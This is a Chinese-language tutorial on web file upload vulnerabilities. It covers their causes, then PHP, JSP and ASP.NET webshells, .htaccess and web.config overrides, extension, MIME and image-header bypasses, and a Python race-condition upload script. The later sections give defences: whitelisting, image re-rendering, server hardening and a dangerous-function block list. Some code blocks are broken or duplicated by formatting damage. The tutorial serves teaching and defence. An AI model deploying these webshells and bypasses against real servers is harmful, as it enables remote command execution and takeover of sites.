# 文件上传漏洞

## 1. 文件上传漏洞原理

### 1.1 基本概念

文件上传漏洞是指Web应用程序在处理用户上传文件时，未对文件进行充分的安全检查，导致攻击者可以上传恶意文件并执行，从而获取服务器控制权。

### 1.2 产生原因

- **文件类型验证不充分**

- **文件内容检查缺失**

- **上传路径可控**

- **文件名未重命名**

- **权限设置不当**

### 1.3 攻击流程

`攻击者构造恶意文件 → 绕过前端验证 → 绕过服务端验证 → 文件成功上传 → 访问执行恶意文件`

## 2. 文件上传漏洞分类

### 2.1 按攻击方式分类

#### 2.1.1 直接上传Webshell

```php
<?php system($_GET['cmd']); ?>
```

#### 2.1.2 文件包含组合利用

```php
<?php include($_GET['file']); ?>
```

<?php include($_GET['file']); ?>

#### 2.1.3 配置文件覆盖

```ini
; 修改PHP配置文件
auto_prepend_file = "shell.php"
```

### 2.2 按漏洞类型分类

#### 2.2.1 前端验证绕过

- 仅依赖JavaScript验证

- 可被直接绕过

#### 2.2.2 服务端MIME类型绕过

- 检查Content-Type头

- 可被伪造

#### 2.2.3 文件扩展名绕过

- 黑名单不全

- 特殊扩展名

#### 2.2.4 文件内容绕过

- 图片马

- 文件头伪造

## 3. 常见攻击载荷

### 3.1 WebShell类型

#### 3.1.1 PHP WebShell

```php
<?php
// 基础一句话
eval($_POST['cmd']);

// 系统命令执行
system($_GET['command']);

// 文件管理
if(isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
}
?>
```

<?php
// 基础一句话
eval($_POST['cmd']);

// 系统命令执行
system($_GET['command']);

// 文件管理
if(isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
}
?>

#### 3.1.2 JSP WebShell

```jsonp
<%
if(request.getParameter("f")!=null) {
 new java.io.FileOutputStream(application.getRealPath("/") + 
request.getParameter("f")).write(request.getParameter("t").getBytes());
}
%>
```

#### 3.1.3 [ASP.NET](https://asp.net/) WebShell

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    void Page_Load(object sender, EventArgs e) {
        Process.Start(Request["cmd"]);
    }
</script>
```

### 3.2 特殊文件类型

#### 3.2.1 .htaccess文件

```apacheconf
<Files "shell.jpg">
SetHandler application/x-httpd-php
</Files>
```

#### 3.2.2 web.config文件

```xml
<configuration>
    <system.webServer>
        <handlers>
            <add name="shell" path="*.jpg" verb="*" 
                 type="System.Web.UI.PageHandlerFactory" 
                 resourceType="Unspecified" />
        </handlers>
    </system.webServer>
</configuration>
```

<configuration>
    <system.webServer>
        <handlers>
            <add name="shell" path="*.jpg" verb="*" 
                 type="System.Web.UI.PageHandlerFactory" 
                 resourceType="Unspecified" />
        </handlers>
    </system.webServer>
</configuration>

## 4. 绕过技术

### 4.1 前端验证绕过

#### 4.1.1 禁用JavaScript

- 浏览器设置禁用JS

- 使用Burp Suite等工具

#### 4.1.2 直接发送请求

```bash
curl -X POST -F "file=@shell.php" http://target.com/upload
```

### 4.2 MIME类型绕过

#### 4.2.1 修改Content-Type

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data

Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg
```

<?php system($_GET['cmd']); ?>

### 4.3 文件扩展名绕过

#### 4.3.1 大小写混合

```php
shell.PHP
shell.Php
```

#### 4.3.2 特殊扩展名

```php
shell.php5
shell.phtml
shell.phps
shell.php7
```

#### 4.3.3 双重扩展名

```php
shell.jpg.php
shell.php.jpg
```

#### 4.3.4 空字节截断

```php
shell.php%00.jpg
shell.php\x00.jpg
```

#### 4.3.5 点号空格

```php
shell.php.
shell.php
```

### 4.4 文件内容绕过

#### 4.4.1 图片马

```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

#### 4.4.2 文件头伪造

```php
\xFF\xD8\xFF\xE0 // JPEG文件头
<?php system($_GET['cmd']); ?>
```

#### 4.4.3 注释绕过

```php
/*<?php */ system($_GET['cmd']); /* */
```

### 4.5 解析漏洞利用

#### 4.5.1 Apache解析漏洞

```textile
test.php.jpg // 可能被解析为PHP
```

#### 4.5.2 IIS解析漏洞

```textile
test.asp;.jpg // IIS6.0解析漏洞
```

#### 4.5.3 Nginx解析漏洞

```textile
test.jpg/.php // 错误配置导致
```

### 4.6 竞争条件利用

#### 4.6.1 文件上传与检查的时间差

```python
import threading
import requests

def upload_file():
    # 快速上传文件
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    requests.post('http://target.com/upload', files=files)

def access_file():
    # 在检查完成前访问文件
    requests.get('http://target.com/uploads/shell.php?cmd=id')

# 同时执行上传和访问
threading.Thread(target=upload_file).start()
threading.Thread(target=access_file).start()
```

## 5. 防御措施

### 5.1 文件类型验证

#### 5.1.1 白名单验证

```php
function validateFileType($filename, $allowed_types) {
 $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
 return in_array($extension, $allowed_types);
}

// 只允许特定扩展名
$allowed_types = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
if (!validateFileType($_FILES['file']['name'], $allowed_types)) {
 die('File type not allowed');
}
```

#### 5.1.2 MIME类型检测

```php
function validateMimeType($file_tmp_path, $allowed_mimes) {
 $finfo = finfo_open(FILEINFO_MIME_TYPE); $mime_type = finfo_file($finfo, $file_tmp_path);
 finfo_close($finfo);
```

return in_array($mime_type, $allowed_mimes);

```
}

$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];
if (!validateMimeType($_FILES['file']['tmp_name'], $allowed_mimes)) {
 die('MIME type not allowed');
}
```

### 5.2 文件内容检查

#### 5.2.1 文件头验证

```php
function validateFileHeader($file_tmp_path) {
    $file_header = bin2hex(file_get_contents($file_tmp_path, false, null, 0, 4));

    $valid_headers = [
        'ffd8ffe0' => 'jpg',
        '89504e47' => 'png',
        '47494638' => 'gif',
        '25504446' => 'pdf'
    ];

    return array_key_exists($file_header, $valid_headers);
}
```

#### 5.2.2 图片重渲染

```php
function reprocessImage($file_tmp_path, $output_path) {
    $image_info = getimagesize($file_tmp_path);

    switch($image_info[2]) {
        case IMAGETYPE_JPEG:
            $image = imagecreatefromjpeg($file_tmp_path);
            imagejpeg($image, $output_path, 100);
            break;
        case IMAGETYPE_PNG:
            $image = imagecreatefrompng($file_tmp_path);
            imagepng($image, $output_path);
            break;
        case IMAGETYPE_GIF:
            $image = imagecreatefromgif($file_tmp_path);
            imagegif($image, $output_path);
            break;
        default:
            return false;
    }

    imagedestroy($image);
    return true;
}
```

### 5.3 文件名安全处理

#### 5.3.1 文件名重命名

```php
function generateSafeFilename($original_name) {
    $extension = strtolower(pathinfo($original_name, PATHINFO_EXTENSION));
    $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];

    if (!in_array($extension, $allowed_extensions)) {
        return false;
    }

    // 使用随机名称
    $new_name = bin2hex(random_bytes(16)) . '.' . $extension;
    return $new_name;
}
```

#### 5.3.2 特殊字符过滤

```php
function sanitizeFilename($filename) {
    // 移除危险字符
    $dangerous_chars = ['/', '\\', ':', '*', '?', '"', '<', '>', '|', '%00'];
    $filename = str_replace($dangerous_chars, '', $filename);

    // 限制文件名长度
    $filename = substr($filename, 0, 255);

    return $filename;
}
```

### 5.4 上传路径安全

#### 5.4.1 防止路径遍历

```php
function validateUploadPath($upload_dir, $filename) {
 $full_path = $upload_dir . DIRECTORY_SEPARATOR . $filename; $real_upload_dir = realpath($upload_dir); $real_full_path = realpath(dirname($full_path));
```

// 确保文件在指定目录内
return strpos($real_full_path, $real_upload_dir) === 0;

```
}
```

#### 5.4.2 独立存储桶

```php
// 使用独立域名存储静态文件
$static_domain = 'https://static.example.com'; $upload_dir = '/var/www/static/';
```

### 5.5 服务器配置加固

#### 5.5.1 Nginx配置

```nginx
ocation ~* \.php$ {
    # 禁止直接访问上传目录中的PHP文件
    location ~ /uploads/.*\.php$ {
        deny all;
    }
}

# 限制上传文件大小
client_max_body_size 10M;
```

#### 5.5.2 Apache配置

```apacheconf
<Directory "/var/www/uploads">
    # 禁止执行PHP文件
    php_flag engine off
    RemoveHandler .php .php5 .phtml
    RemoveType .php .php5 .phtml

    # 只允许访问图片文件
    <FilesMatch "\.(php|php5|phtml)$">
        Deny from all
    </FilesMatch>
</Directory>
```

</Directory>

#### 5.5.3 PHP配置

```ini
; 限制文件上传大小
upload_max_filesize = 10M
post_max_size = 10M

; 禁用危险函数
disable_functions = exec,passthru,shell_exec,system,proc_open,popen

; 限制文件上传
file_uploads = On
max_file_uploads = 20
```

### 5.6 权限控制

#### 5.6.1 文件系统权限

```bash
# 设置上传目录权限

chown www-data:www-data /var/www/uploads
chmod 755 /var/www/uploads 
# 确保文件不可执行

find /var/www/uploads -type f -exec chmod 644 {} \;
```

#### 5.6.2 数据库存储文件信息

```php
class FileManager {
 private $db;
```

public function __construct($db) {
    $this->db = $db;
}

public function saveFile($file_info, $user_id) {
    $stmt = $this->db->prepare(
        "INSERT INTO files (user_id, filename, stored_name, mime_type, size, upload_time) 
         VALUES (?, ?, ?, ?, ?, NOW())"
    );

    $stored_name = bin2hex(random_bytes(16)) . '.' . 
                  pathinfo($file_info['name'], PATHINFO_EXTENSION);
    
    $stmt->execute([
        $user_id,
        $file_info['name'],
        $stored_name,
        $file_info['type'],
        $file_info['size']
    ]);
    
    return $stored_name;

}

```
}
```

## 6. 安全框架和库

### 6.1 使用安全文件处理库

#### 6.1.1 PHP Intervention Image

```php
use Intervention\Image\ImageManager;

function processUploadedImage($input_path, $output_path) {
 $manager = new ImageManager(['driver' => 'gd']);
```

try {
    $image = $manager->make($input_path);
    $image->save($output_path);
    return true;
} catch (Exception $e) {
    return false;
}

```
}
```

#### 6.1.2 Python Pillow库

```python
from PIL import Image
import os

def process_image(input_path, output_path):
 try:
 with Image.open(input_path) as img:
 # 转换格式并保存
 img.save(output_path, 'JPEG', quality=85)
 return True
 except Exception as e:
 os.remove(input_path) # 删除可疑文件
 return False
```

## 7. 检测和测试

### 7.1 手动测试方法

#### 7.1.1 测试用例矩阵

| 测试类型     | 测试载荷                     | 预期结果     |
| -------- | ------------------------ | -------- |
| 扩展名测试    | shell.php.jpg            | 应该被拒绝    |
| MIME类型测试 | Content-Type: image/jpeg | 应该验证文件内容 |
| 文件内容测试   | 图片包含PHP代码                | 应该被拒绝或净化 |

#### 7.1.2 测试工具

- **Burp Suite** - 拦截和修改上传请求

- **OWASP ZAP** - 自动化安全扫描

- **Upload Scanner** - 专门的文件上传测试工具

### 7.2 自动化安全扫描

#### 7.2.1 自定义测试脚本

```python
import requests
import threading

class UploadTester:
 def __init__(self, target_url):
 self.target_url = target_url
 self.session = requests.Session()
```

def test_extension_bypass(self):
    payloads = [
        'shell.php',
        'shell.PHP',
        'shell.php5',
        'shell.phtml',
        'shell.php.jpg',
        'shell.jpg.php'
    ]

    for payload in payloads:
        files = {'file': (payload, '<?php system($_GET["cmd"]); ?>', 'image/jpeg')}
        response = self.session.post(self.target_url, files=files)
    
        if response.status_code == 200 and 'success' in response.text.lower():
            print(f"Potential vulnerability: {payload}")

```

```

## 8. 最佳实践

### 8.1 开发阶段

1. **实施严格的白名单验证**

2. **进行文件内容检查**

3. **使用安全的文件命名策略**

4. **配置适当的服务器权限**

### 8.2 安全文件上传流程

```php
class SecureFileUpload {
 private $allowed_types = ['jpg', 'jpeg', 'png', 'gif'];
 private $allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];
 private $max_size = 10485760; // 10MB

public function upload($file) {
    // 1. 检查文件大小
    if ($file['size'] > $this->max_size) {
        throw new Exception('File too large');
    }

    // 2. 验证扩展名
    $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    if (!in_array($extension, $this->allowed_types)) {
        throw new Exception('File type not allowed');
    }

    // 3. 验证MIME类型
    $mime_type = $this->getMimeType($file['tmp_name']);
    if (!in_array($mime_type, $this->allowed_mimes)) {
        throw new Exception('MIME type not allowed');
    }

    // 4. 验证文件头
    if (!$this->validateFileHeader($file['tmp_name'])) {
        throw new Exception('Invalid file header');
    }

    // 5. 重命名文件
    $new_filename = $this->generateFilename($extension);

    // 6. 处理图片文件
    if (!$this->reprocessImage($file['tmp_name'], $new_filename)) {
        throw new Exception('Image processing failed');
    }

    return $new_filename;
}

}
```

### 8.3 运维配置

1. **配置Web服务器禁止执行上传目录中的脚本**

2. **设置适当的文件系统权限**

3. **定期审计上传文件**

4. **监控异常上传行为**

## 9. 应急响应

### 9.1 发现恶意文件

1. **立即删除恶意文件**

2. **分析攻击向量和影响范围**

3. **检查日志确定攻击来源**

4. **加强防护措施**

### 9.2 修复流程

```php
// 1. 识别漏洞点
// 缺少文件类型验证的代码

// 2. 实施修复
$uploader = new SecureFileUpload();
try {
    $filename = $uploader->upload($_FILES['file']);
} catch (Exception $e) {
    // 记录日志并返回错误
    error_log("Upload failed: " . $e->getMessage());
    http_response_code(400);
    exit;
}

// 3. 验证修复
// 测试各种绕过技术是否有效
```

### 9.3 后续改进

1. **实施WAF规则**

2. **加强文件内容检测**

3. **建立文件上传监控**

4. **进行安全培训**

## 10. 云环境特殊考虑

### 10.1 对象存储安全

```python
# AWS S3安全配置
import boto3
from botocore.config import Config

s3 = boto3.client('s3', config=Config(signature_version='s3v4'))

def upload_to_s3(file_path, bucket_name):
    # 设置ACL为私有
    extra_args = {
        'ACL': 'private',
        'ContentType': 'image/jpeg'
    }

    s3.upload_file(
        file_path, 
        bucket_name, 
        file_path, 
        ExtraArgs=extra_args
    )

    # 生成预签名URL（临时访问）
    url = s3.generate_presigned_url(
        'get_object',
        Params={'Bucket': bucket_name, 'Key': file_path},
        ExpiresIn=3600
    )

    return url
```

### 10.2 CDN安全配置

```nginx
# 只允许缓存和分发安全文件类型
location ~* \.(jpg|jpeg|png|gif|css|js)$ {
    # CDN缓存配置
    expires 1y;
    add_header Cache-Control "public, immutable";
}

location ~* \.(php|asp|aspx|jsp)$ {
    # 禁止访问动态脚本
    deny all;
}
```

# 